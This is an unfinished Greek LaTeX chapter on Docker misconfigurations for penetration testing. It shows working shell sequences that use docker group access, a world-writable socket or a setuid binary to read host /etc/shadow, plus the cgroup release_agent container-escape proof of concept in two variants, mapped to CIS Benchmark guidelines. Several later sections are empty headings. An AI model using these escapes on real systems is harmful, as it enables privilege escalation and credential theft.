\chapter{Γνωστά \textlatin{Docker CVEs}}
\label{knownDockerCves}

Επειδή το \textlatin{Docker} είναι τόσο δημοφιλές, πολλοί ερευνητές ασφαλείας
προσπαθούν βρουν και να τεκμηριώσουν διάφορες ευπάθειες. Σε αυτό το κεφάλαιο
συζητάμε τα τρωτά σημεία υψηλού αντίκτυπου που είναι χρήσιμα κατά τη διάρκεια
μιας δοκιμής διείσδυσης. Αυτά χωρίζονται σε εσφαλμένες ρυθμίσεις
(\textlatin{misconfiguration} και σφάλματα (\textlatin{bugs}).

Σφάλματα λογισμικού και εσφαλμένες ρυθμίσεις παραμέτρων μπορεί να είναι και τα
δύο προβλήματα ασφαλείας, αλλά διαφέρουν στο ποιος έκανε το λάθος.

Ένα \texttt{\textlatin{bug}} είναι ένα πρόβλημα σε ένα ίδιο το πρόγραμμα. Για
παράδειγμα, υπερχείλιση ενός \textlatin{buffer} είναι ένα σφάλμα. Το πρόβλημα
έγκειται αποκλειστικά στο ίδιο το πρόγραμμα. Για να διορθωθεί, πρέπει να
αλλάξει ο κώδικας του προγραμμάτος.

Οι εσφαλμένες ρυθμίσεις, από την άλλη πλευρά, είναι προβλήματα ασφάλειας που
προκύπτουν από την λάθος χρήση ενός προγράμματος. Το πρόγραμμα δεν έχει
ρυθμιστεί σωστά και αυτό δημιουργεί μια κατάσταση που μπορεί να είναι
εκμεταλλεύσιμη για έναν επιτιθέμενο. Μια δημόσια διαθέσιμη κονσόλα εντοπισμού
σφαλμάτων (\textlatin{debugging console}) σε έναν ιστότοπο 
\footnote{Με αυτό τον τρόπο η εταιρεία \textlatin{Patreon} χακαρίστηκε πριν
κάποια χρόνια. Βλ.\textlatin{https://labs.detectify.com/2015/10/02/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/}}
ή ένα δημοσίως αναγνώσιμο αρχείο που περιέχει κωδικούς πρόσβασης είναι
παραδείγματα εσφαλμένων ρυθμίσεων. Για να διορθώσει μια εσφαλμένη
ρύθμιση, ο χρήστης θα πρέπει να αλλάξει τη ρύθμιση του προγράμματος ή την
υποδομή του. Οι προγραμματιστές του προγράμματος μπορούν να προτείνουν μόνο
τη σωστή διαμόρφωση που πρέπει να εφαρμόσουν οι χρήστες.

Δεν αποτελούν πλήρη παραδείγματα επιθέσεων όλα τα τρωτά σημεία που καλύπτονται
σε αυτό το κεφάλαιο. Τα περισσότερα είναι χρήσιμα ως μέρος μιας επίθεσης όταν
χρησιμοποιούνται σε συνδυασμό με άλλα τρωτά σημεία. Για παράδειγμα,
παρακάμπτοντας έναν μηχανισμό προστασίας. Ωστόσο, ορισμένα σοβαρά σφάλματα
είναι επικίνδυνα ακόμη και όταν χρησιμοποιούνται από μόνα τους.
Για παράδειγμα, η κακόβουλη χρήση του \textlatin{Docker socket} που καλύπτεται
στην επόμενη ενότητα και το \textlatin{CVE-2019-16884} είναι διαφυγές κοντέινερ.

Επειδή υπάρχουν πολλοί ερευνητές ασφάλειας που αναζητούν σφάλματα στο λογισμικό
\textlatin{containerization}, η ενότητα 4.2 πιθανότατα θα καταστεί ξεπερασμένη
γρήγορα και για αυτό το λόγο δεν θα πρέπει να λαμβάνεται σοβαρά.

Όλοι οι κίνδυνοι αυτών των σφαλμάτων μπορούν να αποφευχθούν χρησιμοποιώντας
την πιο πρόσφατη έκδοση των εικόνων \textlatin{Docker} και του
\textlatin{Docker}.

Λόγω των παραπάνω λόγων, θα επικεντρωθούμε περισσότερο στις εσφαλμένες
ρυθμίσεις σε αυτό το κεφάλαιο και τα επόμενα κεφάλαια.

Στο κεφάλαιο 5 θα δούμε πώς μπορούν να εντοπιστούν αυτά τα τρωτά σημεία
κατά τη διάρκεια μιας δοκιμής διείσδυσης. Στο κεφάλαιο 6 θα συνδυάσουμε τις
πληροφορίες από αυτό το κεφάλαιο και το κεφάλαιο 5 σε μια λίστα ελέγχου.

\section{\textlatin{Misconfigurations}}

Σε αυτήν την ενότητα, θα ρίξουμε μια ματιά στις εσφαλμένες ρυθμίσεις του
\textlatin{Docker} και του αντίκτυπο που μπορεί να έχουν αυτές οι εσφαλμένες
ρυθμίσεις. Για κάθε εσφαλμένη ρύθμιση, θα μελετήσουμε πρακτικά
παραδείγματα καθώς επίσης και τον αντίκτυπο.


Οι δύο πρώτες εσφαλμένες διαμορφώσεις που θα εξετάσουμε σχετίζονται με
επιθέσεις που εκτελούνται σε έναν κεντρικό υπολογιστή και πρόκειται για
επιθέσεις \textlatin{Docker daemon}. Οι άλλες εσφαλμένες ρυθμίσεις σχετίζονται
με επιθέσεις που εκτελούνται μέσα από ένα κοντέινερ όπως διαφυγή κοντέινερ.

Αντιστοιχίζουμε κάθε εσφαλμένη διαμόρφωση στις σχετικές κατευθυντήριες γραμμές
αναφοράς του \textlatin{CIS Docker Benchmark} (εάν υπάρχουν). Θα δούμε ότι το
\textlatin{CIS Docker Benchmark} δεν καλύπτει όλες τις εσφαλμένες
ρυθμίσεις.

\subsection{\textlatin{Docker Permissions}}

Μια συνηθισμένη (και διαβόητη) εσφαλμένη διαμόρφωση είναι η παροχή πρόσβασης
στο \textlatin{Docker} σε μη προνομιούχους χρήστες, το οποίο τους επιτρέπει να
δημιουργούν, να ξεκινούν και άλλοτε να αλληλεπιδρούν με 
με κοντέινερ \textlatin{Docker} (μέσω του \textlatin{Docker Daemon}). Αυτό
είναι επικίνδυνο επειδή επιτρέπει στους μη προνομιούχους χρήστες να έχουν
πρόσβαση σε όλα τα αρχεία ως \texttt{\textlatin{root}}. Η τεκμηρίωση του
\textlatin{Docker} λέει:
\footnote{\textlatin{https://docs.docker.com/engine/security/security/}}.

\emph{Πρώτα απόλα μόνο σε έμπιστους χρήστες πρέπει να επιστρέπεται να έχουν
τον έλεγχο του \textlatin{Docker Daemon}. Αυτό είναι άμεση συνέπεια από κάποια
από τα πιο ισχυρά χαρακτηριστικά του \textlatin{Docker}. Συγκεκριμένα το
\textlatin{Docker}, επιτρέπει σε κάποιον να μοιραστεί έναν κατάλογο μεταξύ του
υπολογιστή όπου τρέχει το \textlatin{Docker} και του φιλοξενούμενου κοντέινερ
και το επιτρέπει αυτό χωρίς να περιορίσει τα δικαιώματα πρόσβασης του κοντέινερ.
Αυτό σημαίνει ότι μπορεί κανείς να ξεκινήσει από ένα κοντέινερ όπου ο κατάλογος
\textlatin{/host} είναι ο κατάλογος / στον κεντρικό υπολογιστή και το κοντέινερ
μπορεί να αλλάξει το σύστημα αρχείων του κεντρικού υπολογιστή χωρίς κανέναν
περιορισμό.}

Εν ολίγοις, επειδή ο \textlatin{Docker Daemon} εκτελείται ως
\texttt{\textlatin{root}}, εάν ένας χρήστης προσθέσει ένα κατάλογο ως
\textlatin{volume} σε ένα κοντέινερ, η πρόσβαση σε αυτό το αρχείο γίνεται ως
\texttt{\textlatin{root}}. Υπάρχουν μερικοί τρόποι πρόσβασης στο Docker για μη
προνομιούχους χρήστες. Σε αυτή την ενότητα θα τους ερευνήσουμε.

\subsubsection{\texttt{\textlatin{docker}} \textlatin{Group}}

Κάθε χρήστης στην ομάδα \texttt{\textlatin{docker}} επιτρέπεται να χρησιμοποιεί
το \textlatin{Docker}.
Αυτό επιτρέπει τη διαχείριση πρόσβασης στη χρήση του \textlatin{Docker}.
Μερικές φορές ένας διαχειριστής συστήματος δεν θέλει να κάνει σωστή διαχείριση
πρόσβασης και προσθέτει κάθε χρήστη στην ομάδα \texttt{\textlatin{docker}},
γιατί αυτό επιτρέπει την ομαλή λειτουργία των πάντων.
Αυτή η εσφαλμένη ρύθμιση, ωστόσο, επιτρέπει σε κάθε χρήστη να έχει πρόσβαση σε
κάθε αρχείο του συστήματος, όπως απεικονίζεται και παρακάτω.

Ας υποθέσουμε ότι θέλουμε ο κατακερματισμένος κωδικός πρόσβασης του
διαχειριστή σε ένα σύστημα όπου δεν έχουμε προνόμια \texttt{\textlatin{sudo}},
αλλά είμαστε μέλος της ομάδας \texttt{\textlatin{docker}}. \\
 
\texttt{\textlatin{(host)\$ sudo -v}}

\texttt{\textlatin{Sorry, user unpriv may not run sudo on host.}}

\texttt{\textlatin{(host)\$ groups | grep -o docker}}

\texttt{\textlatin{docker}}

\texttt{\textlatin{(host)\$ docker run -it --rm -v /:/host ubuntu:latest bash}}

\texttt{\textlatin{(cont)\# grep admin /host/etc/shadow}}

\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\


Στην παραπάνω λίστα ελέγχουμε πρώτα τα δικαιώματα μας. Δεν έχουμε
\texttt{\textlatin{sudo}} δικαιώματα, αλλά είμαστε μέλος της ομάδας
\texttt{\textlatin{docker}}. Αυτό μας επιτρέπει να δημιουργήσουμε ένα κοντέινερ
με / προσαρτημένο ως \textlatin{volume} και αποκτήσoυμε πρόσβαση σε οποιοδήποτε
αρχείο ως \texttt{\textlatin{root}}.
Αυτό περιλαμβάνει το αρχείο με κατακερματισμούς κωδικούς πρόσβασης χρήστη
(π.χ. \texttt{\textlatin{/etc/passwd}}).

Ένα πραγματικό παράδειγμα της επίδρασης των εσφαλμένων ρυθμισμένων διακαιωμάτων
\textlatin{Docker} συνέβη πριν από λίγα χρόνια με ένα από τα μαθήματα στο
\textlatin{Computing Science curriculum} (του \textlatin{Radboud}). Ένα
καθηγητής ήθελε να διδάξει μαθητές σχετικά με \textlatin{containerization} και
την ανάπτυξη σύγχρονου λογισμικού. Ο καθηγητής ζήτησε από το τμήμα πληροφορικής
να εγκαταστήσει το \textlatin{Docker} σε όλους τους φοιτητικούς υπολογιστές και
να προσθέσει όλους τους μαθητές του μαθήματος στην ομάδα
\texttt{\textlatin{docker}} (παρέχοντάς τους πλήρη δικαιώματα για να τρέξου το
\textlatin{Docker}). Αυτό έδωσε σε κάθε μαθητή το ισοδύναμο του
\texttt{\textlatin{root}} δικαιώματα σε κάθε σταθμό εργασίας. Αυτό ήταν ένα
πρόβλημα, επειδή επέτρεπε στους μαθητές να διαβάζουν ευαίσθητες πληροφορίες
(π.χ. ιδιωτικά κλειδιά και κατακερματισμένους κωδικούς πρόσβασης όλων των
χρηστών) και να κάνουν αλλαγές στο σύστημα.

Η ομάδα docker καλύπτεται από την κατευθυντήρια γραμμή 1.2.2 του
\textlatin{CIS Docker Benchmark} (Βεβαιωθείτε ότι επιτρέπεται μόνο σε
αξιόπιστους χρήστες να ελέγχουν τον \textlatin{Docker Daemon}).

\subsubsection{Δημόσια αναγνώσιμο και εγγράψιμο \textlatin{Docker Socket}}

Από προεπιλογή, μόνο ο \texttt{\textlatin{root}} και κάθε χρήστης στην ομάδα
\textlatin{docker} έχει πρόσβαση στο \textlatin{Docker}, επειδή έχουν πρόσβαση
ανάγνωσης και εγγραφής στο \textlatin{Docker Socket}. Ωστόσο, ορισμένοι
διαχειριστές ορίζουν τα δικαιώματα ανάγνωσης και εγγραφής για όλους τους χρήστες
(π.χ \texttt{666}), δίνοντας σε όλους τους χρήστες πρόσβαση στον
\textlatin{Docker Daemon}. \\

\texttt{\textlatin{(host)\$ groups | grep -o docker}}

\texttt{\textlatin{(host)\$ ls -l /var/run/docker.sock}}

\texttt{\textlatin{srw-rw-rw- 1 root docker 0 Dec 15 13:16 /var/run/docker.sock}}

\texttt{\textlatin{(host)\$ docker run -it --rm -v /:/host ubuntu:latest bash}}

\texttt{\textlatin{(cont)\# grep admin /host/etc/shadow}}

\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\

Στη παραπάνω λίστα, βλέπουμε ότι δεν είμαστε μέλος της ομάδας
\textlatin{Docker}, αλλά επειδή κάθε χρήστης έχει πρόσβαση ανάγνωσης και
εγγραφής (δηλαδή τα δικαιώματα "ανάγνωση" και "εγγραφή" έχουν οριστεί για
\textlatin{other}) στο \textlatin{Docker Socket} μπορούμε ακόμα να
χρησιμοποιήσουμε το \textlatin{Docker}.

Αυτό καλύπτεται από την κατευθυντήρια γραμμή 3.4 του
\textlatin{CIS Docker Benchmark} (Βεβαιωθείτε ότι τα δικαιώματα του αρχείου
\texttt{\textlatin{docker.socket}} έχουν οριστεί σε \texttt{644} ή πιο
περιοριστικά).

\subsubsection{\texttt{\textlatin{setuid}} \textlatin{Bit}}

Ένας άλλος τρόπος με τον οποίο οι διαχειριστές συστήματος ενδέχεται να
παραλείψουν τη σωστή διαχείριση πρόσβασης είναι να ορίσουν το \textlatin{bit}
\texttt{\textlatin{setuid}} στο \textlatin{docker binary}.

Το \texttt{\textlatin{setuid}} \textlatin{bit} είναι ένα \textlatin{bit} άδειας
στο \textlatin{Unix}, που επιτρέπει στους χρήστες να τρέξουν
\textlatin{binaries} ως κάτοχος (ή ομάδα) του \textlatin{binary} αντί για τον
εαυτό τους. Αυτό είναι χρήσιμο σε συγκεκριμένες περιπτώσεις. Για παράδειγμα,
οι χρήστες θα πρέπει να μπορούν να αλλάζουν τους δικούς τους κωδικούς πρόσβασης,
αλλά δεν θα πρέπει να είναι σε θέση να διαβάσουν τους κατακερματισμούς κωδικών
πρόσβασης άλλους χρήστες. Γι' αυτό το \texttt{\textlatin{passwd}}
\textlatin{binary} (το οποίο χρησιμοποιείται για την αλλαγή του κωδικού
πρόσβασης κάποιου χρήστη) έχει οριστεί το \texttt{\textlatin{setuid}}
\textlatin{bit}. Ένας χρήστης μπορεί να αλλάξει τον κωδικό πρόσβασής του,
επειδή το \texttt{\textlatin{passwd}} εκτελείται ως \texttt{\textlatin{root}}
(ο κάτοχος του \texttt{\textlatin{passwd}}) και, φυσικά, ως
\texttt{\textlatin{root}} μπορεί να διαβάζει και να γράφει στο αρχείο κωδικού
πρόσβασης. Σε αυτή την περίπτωση το \texttt{\textlatin{setuid}} \textlatin{bit}
δεν είναι θέμα ασφαλείας, επειδή το \texttt{\textlatin{passwd}} ζητά τον κωδικ
πρόσβασης του χρήστη από μόνο του και θα αλλάξει μόνο συγκεκριμένες καταχωρήσεις
στο αρχείο κωδικού πρόσβασης.

Εάν ένα σύστημα έχει ρυθμιστεί εσφαλμένα με τη ρύθμιση του
\texttt{\textlatin{setuid}} \textlatin{bit} για το \textlatin{docker binary},
ένας χρήστης θα μπορεί να εκτελέσει το \textlatin{Docker} ως
\texttt{\textlatin{root}} (ο κάτοχος του \textlatin{docker binary}). Όπως και
πριν, μπορούμε εύκολα να αναπαράξουμε αυτήν την επίθεση. \\

\texttt{\textlatin{(host)\$ sudo -v}}

\texttt{\textlatin{Sorry, user unpriv may not run sudo on host.}}

\texttt{\textlatin{(host)\$ groups | grep -o docker}}

\texttt{\textlatin{(host)\$ ls -halt /usr/bin/docker}}

\texttt{\textlatin{-rwsr-xr-x 1 root root 85M nov 18 17:52 /usr/bin/docker}}

\texttt{\textlatin{(host)\$ docker run -it --rm -v /:/host ubuntu:latest bash}}

\texttt{\textlatin{(cont)\# grep admin /host/etc/shadow}}

\texttt{\textlatin{admin:\$6\$VOSV5AVQ\$jHWxAVAUgl...:18142:0:99999:7:::}} \\

Στη παραάνω λίστα βλέπουμε ότι δεν είμαστε μέρος της ομάδας \textlatin{docker},
αλλά μπορούμε ακόμα να εκτελέσουμε το \textlatin{docker} επειδή το
\texttt{\textlatin{setuid}} \textlatin{bit} (και το
\texttt{\textlatin{execute}} \textlatin{bit} για όλους χρήστες) έχει οριστεί.

Αυτό δεν καλύπτεται από τις κατευθυντήριες γραμμές του
\textlatin{CIS Docker Benchmark}. Υπάρχουν πολλές οδηγίες σχετικά με τα σωστά
δικαιώματα αρχείων και καταλόγου, αλλά καμία δεν καλύπτει τα
\textlatin{binaries}.

\subsection{Αναγνώσιμα αρχεία ρυθμίσεων}

Επειδή η ρύθμιση περιβαλλόντων με το \textlatin{Docker} μπορεί να είναι
αρκετά περίπλοκη, πολλοί χρήστες \textlatin{Docker} χρησιμοποιούν προγράμματα
(π.χ. \texttt{\textlatin{docker-compose}}) για να αποθηκεύσουν όλες τις
απαραίτητες ρυθμίσεις \textlatin{Docker} στα αρχεία διαμόρφωσης για να
καταργήσουν την ανάγκη επαναληπτικών βημάτων και διαμορφώσεων. Αυτά τα αρχεία
ρυθμίσεων συχνά περιέχουν ευαίσθητες πληροφορίες. Εάν τα δικαιώματα σε αυτά τα
αρχεία δεν έχουν ρυθμιστεί σωστά, οι χρήστες οι οποίοι δεν θα έπρεπε να μπορούν
να τα διαβάσουν θα τα διαβάζουν.

Οι χρήστες \textlatin{Docker} και οι \textlatin{penetration testers} θα πρέπει
να δώσουν ιδιαίτερη προσοχή σε αυτά αρχεία, γιατί θα μπορούσαν εύκολα να
οδηγήσουν σε διαρροή μυστικών.

Δύο κοινά αρχεία που ενδέχεται να περιέχουν ευαίσθητες πληροφορίες είναι τα 
\texttt{\textlatin{.docker
/config.json}} και \texttt{\textlatin{docker-compose.yaml}}.

Αυτό δεν καλύπτεται σε καμία οδηγία του \textlatin{CIS Docker Benchmark}. Καλύπτονται πολλά αρχεία διαμόρφωσης (π.χ. /etc/docker/daemon.json), αλλά
δεν υπάρχουν αρχεία καθορισμένα από το χρήστη.

\subsubsection{\texttt{\textlatin{.docker/config.json}}}

Κατά το ανέβασμα εικόνων σε ένα μητρώο, οι χρήστες πρέπει να συνδεθούν στο
μητρώο στο οποίο πιστοποιούν τον εαυτό τους. Θα ήταν αρκετά ενοχλητικό να
συνδεόμαστε κάθε φορά που ένας χρήστης θέλει να ανεβάσει μια εικόνα. Αυτός
είναι ο λόγος για τον οποίο το \texttt{\textlatin{.docker/config.json}}
αποθηκεύει προσωρινά αυτά τα \textlatin{credentials}. Αυτά είναι αποθηκευμένα
σε κωδικοποίηση \textlatin{Base64} στον αρχικό κατάλογο του χρήστη από
προεπιλογή
\footnote{\textlatin{https://docs.docker.com/engine/reference/commandline/login/}}.
Ένας επιτιθέμενος με πρόσβαση στο αρχείο μπορεί να χρησιμοποιήσει τα
\textlatin{credentials} για να συνδεθεί και να ανεβάσει κακόβουλες εικόνες
\textlatin{Docker} \cite{Docker-Credentials-Metasploit}.

\subsubsection{\texttt{\textlatin{docker-compose.yml}}}

Τα αρχεία \texttt{\textlatin{docker-compose.yml}} συχνά περιέχουν μυστικά (π.χ.
κωδικούς πρόσβασης και κλειδιά \textlatin{API}), επειδή όλες οι πληροφορίες που
πρέπει να διαβιβαστούν σε ένα κοντέινερ αποθηκεύονται στο
αρχείο \texttt{\textlatin{docker-compose.yml}} \footnote{Η καταλήξεις
\texttt{\textlatin{yml}} και \texttt{\textlatin{yaml}} είναι ταυτοδύναμες όμως
η επίσημη είναι η \texttt{\textlatin{yaml}}}.

\subsection{\textlatin{Privileged Mode}}

Το \textlatin{Docker} έχει μια ειδική προνομιακή λειτουργία
\cite{Docker-in-Docker-Blog}. Αυτή η λειτουργία είναι ενεργοποιημένη εάν κατά
την δημιουργία ενός κοντέινερ δοθεί η παράμετρος
\texttt{\textlatin{--privileged}} η οποία επιτρέπει τη πρόσβαση σε όλους τους
κεντρικούς υπολογιστές συσκευές και σε δυνατότητες του πυρήνα. Αυτή είναι μια
ισχυρή λειτουργία που επιτρέπει ορισμένες χρήσιμες λειτουργίες (π.χ. δημιουργία
εικόνων \textlatin{Docke} μέσα σε κοντέινερ \textlatin{Docker}). Το μειονέκτημα
της προνομιακής λειτουργίας είναι ότι όλες οι λειτουργίες του πυρήνα επιτρέπουν
σε ένα επιτιθέμενο μέσα στο κοντέινερ να διαφύγει και να αποκτήσει πρόσβαση
στον κεντρικό υπολογιστή.

Ένα παράδειγμα αυτού είναι η κατάχρηση ενός χαρακτηριστικού στα
\texttt{\textlatin{cgroups}} \cite{CGroup-Docs}. Όποτε ένα 
\texttt{\textlatin{cgroup}} απελευθερώνεται λόγω απουσίας διεργασιών που
τρέχουν, είναι δυνατό για να εκτελέσουμε μια εντολή (που ονομάζεται
\textlatin{release\_agent}). Είναι δυνατόν να ορίσουμε τέτοια
\textlatin{release\_agent} σε ένα προνομιακό \textlatin{docker}.
Εάν το \texttt{\textlatin{cgroup}} απελευθερωθεί, τότε
η εντολή εκτελείται στον κεντρικό υπολογιστή \cite{TrailOfBits-Docker-Escape}.

Μπορούμε να δούμε μια απόδειξη της ιδέας αυτής της επίθεσης που αναπτύχθηκε από
τον ερευνητή ασφαλείας Felix Wilhelm \cite{Felix-Wilhem-Tweet}. \\

\texttt{\textlatin{1. (host)\$ docker run -it --rm --privileged ubuntu:latest bash}}

\texttt{\textlatin{2. (cont)\# d=`dirname \$(ls -x /s*/fs/c*/*/r* |head -n1)`}}

\texttt{\textlatin{3. (cont)\# mkdir -p \$d/w}}

\texttt{\textlatin{4. (cont)\# echo 1 >\$d/w/notify\_on\_release}}

\texttt{\textlatin{5. (cont)\# t=`sed -n 's/.*\textbackslash perdir=\textbackslash ([\^,]*\textbackslash ).*/\textbackslash 1/p' /etc/mtab`}}

\texttt{\textlatin{6. (cont)\# touch /o}}

\texttt{\textlatin{7. (cont)\# echo \$t/c >\$d/release\_agent}}

\texttt{\textlatin{8. (cont)\# printf '\#!/bin/sh\textbackslash nps >'"\$t/o" >/c}}

\texttt{\textlatin{9. (cont)\# chmod +x /c}}

\texttt{\textlatin{10. (cont)\# sh -c "echo 0 >\$d/w/cgroup.procs"}}

\texttt{\textlatin{11. (cont)\# sleep 1}}

\texttt{\textlatin{12. (cont)\# cat /o}} \\

Η απόδειξη της έννοιας στη παραπάνω λίστα είναι λίγο δύσκολο να διαβαστεί,
γιατί χρησιμοποιεί πολλή σύνταξη \textlatin{Bash} για να συντομεύσει τις
εντολές. Θα αναλύσουμε τις εντολές γραμμή προς γραμμή για να εξηγήσουμε τι
κάνει κάθε μία.

Στη γραμμή 2, το πρώτο \textlatin{cgroup} με \textlatin{release\_agent}
προστίθεται στη μεταβλητή \textlatin{d}. Μια υποομάδα \textlatin{w} προστίθεται
στην ομάδα \textlatin{c} του \textlatin{d} (γραμμή 3) και η εκτέλεση του
\textlatin{release\_agent} είναι ενεργοποιημένο για το \textlatin{w} (γραμμή 4).
Η θέση του κοντέινερ στο σύστημα αρχείων του κεντρικό σύστημα αρχείων
προστίθεται στη μεταβλητή \textlatin{t} (γραμμή 5). Ένα \textlatin{script}
το (/\textlatin{c}), που περιέχει μόνο τη γραμμή "\textlatin{ps > \$t/o"},
δημιουργείται (γραμμή 7) και προστίθεται
ως \textlatin{release\_agent} (γραμμή 8). Μια διαδικασία προσθέτει το εαυτό της
στο \textlatin{w} (γράφοντας «0» στο αρχείο \textlatin{cgroup.procs} του 
\textlatin{w}) στη γραμμή 10. Μετά την εκτέλεση του \textlatin{release\_agent}
(/\textlatin{c}), μπορούμε να δούμε όλες τις διεργασίες στον κεντρικό
υπολογιστή στο /\textlatin{ο}.

Το όρισμα \texttt{\textlatin{--privileged}} καλύπτεται από δύο κατευθυντήριες
γραμμές του \textlatin{CIS Docker Benchmark}. Η Οδηγία 5.4 (Βεβαιωθείτε ότι δεν
χρησιμοποιούνται προνομιακά κοντέινερ) συνιστά να μην δημιουργούμε κοντέινερ με
προνομιακή λειτουργία. Η κατευθυντήρια γραμμή 5.22 (Βεβαιωθείτε ότι οι εντολές
\textlatin{docker exec} δεν χρησιμοποιούνται με την προνομιακή επιλογή) συνιστά
να μην εκτελούνται εντολές σε κοντέινερ που εκτελούνται (με
\textlatin{docker exec}) σε προνομιακή λειτουργία.

\subsection{Δυνατότητες}

Όπως είδαμε σε προηγούμενη ενότητα, προκειμένου να πραγματοποιηθούν προνομιακές
ενέργειες στο πυρήνα \textlatin{Linux}, μια διεργασία χρειάζεται τη σχετική
δυνατότητα. Τα \textlatin{Docker} κοντέινερς ξεκινούν με ελάχιστες δυνατότητες, αλλά είναι
δυνατή η προσθήκη επιπλέον δυνατοτήτων κατά το χρόνο εκτέλεσης. Η παροχή
επιπλέον δυνατοτήτων στα κοντέινερς δίνει στο κοντέινερ άδεια εκτέλεσης
ορισμένων ενεργειών. Ορισμένες από αυτές τις ενέργειες επιτρέπουν να διαφύγει
κανείς από το \textlatin{Docker} κοντέινερ. Θα εξετάσουμε δύο τέτοιες
δυνατότητες στις επόμενες ενότητες.


Το \textlatin{CIS Docker Benchmark} καλύπτει όλα αυτά τα προβλήματα σε μία
κατευθυντήρια γραμμή: 5.3 (Βεβαιωθείτε ότι οι δυνατότητες του πυρήνα του
\textlatin{Linux} είναι περιορισμένες εντός των κοντέινερ).

\subsubsection{\texttt{\textlatin{CAP\_SYS\_ADMIN}}}

Η απόδραση \textlatin{Docker} σύμφωνα με τον \textlatin{Felix Wilhelm}
\cite{Felix-Wilhem-Tweet} που χρησιμοποιήσαμε στην ενότητα 4.1.3 χρειάζεται να
εκτελείται σε προνομιακή λειτουργία για να λειτουργήσει, αλλά μπορεί να
ξαναγραφτεί για να χρειάζεται μόνο το δικαίωμα εκτέλεσης του προσαρτήματος
\cite{TrailOfBits-Docker-Escape}, το οποίο χορηγείται από την δυνατότητα
\texttt{\textlatin{CAP\_SYS\_ADMIN}}. \\

\texttt{\textlatin{1. (host)\$ docker run --rm -it --cap-add=CAP\_SYS\_ADMIN --security -opt apparmor=unconfined ubuntu /bin/bash}}

\texttt{\textlatin{2. (cont)\# mkdir /tmp/cgrp}}

\texttt{\textlatin{3. (cont)\# mount -t cgroup -o rdma cgroup /tmp/cgrp}}

\texttt{\textlatin{4. (cont)\# mkdir /tmp/cgrp/x}}

\texttt{\textlatin{5. (cont)\# echo 1 > /tmp/cgrp/x/notify\_on\_release}}

\texttt{\textlatin{6. (cont)\# host\_path=`sed -n 's/.*\textbackslash perdir=\textbackslash ([\^,]*\textbackslash).*/\textbackslash 1/p' /etc/mtab`}}

\texttt{\textlatin{7. (cont)\# echo "\$host\_path/cmd" > /tmp/cgrp/release\_agent}}

\texttt{\textlatin{8. (cont)\# echo '\#!/bin/sh' > /cmd}}

\texttt{\textlatin{9. (cont)\# echo "ps aux > \$host\_path/output" >> /cmd}}

\texttt{\textlatin{10. (cont)\# chmod a+x /cmd}}

\texttt{\textlatin{11. (cont)\# sh -c "echo \textbackslash \$\textbackslash \$ > /tmp/cgrp/x/cgroup.procs"1}}

\texttt{\textlatin{12. (cont)\# cat /output}} \\

Σε αντίθεση με πριν, αντί να βασιζόμαστε στη παράμετρο
\texttt{\textlatin{--privileged}} για να μας δώσει πρόσβαση εγγραφής σε ένα
\textlatin{cgroup}, πρέπει απλώς να κάνουμε \textlatin{mount} τη δική μας. Στη
γραμμή 2 και γραμμή 3 ένα νέο \textlatin{cgroup} με όνομα \textlatin{cgrp}
δημιουργείται και προσαρτάται στο \textlatin{/tmp/cgrp}. Τώρα έχουμε ένα
\textlatin{cgroup} στο οποίο έχουμε επίσης πρόσβαση εγγραφής, έτσι μπορούμε να
εκτελέσουμε το ίδιο \textlatin{exploit} όπως στο ενότητα 4.1.3.

\subsubsection{\texttt{\textlatin{CAP\_DAC\_READ\_SEARCH}}}

\subsection{\textlatin{Docker Socket}}



\section{Σφάλματα Λογισμικού}
\section{Γνωστά \textlatin{Docker CVEs}}

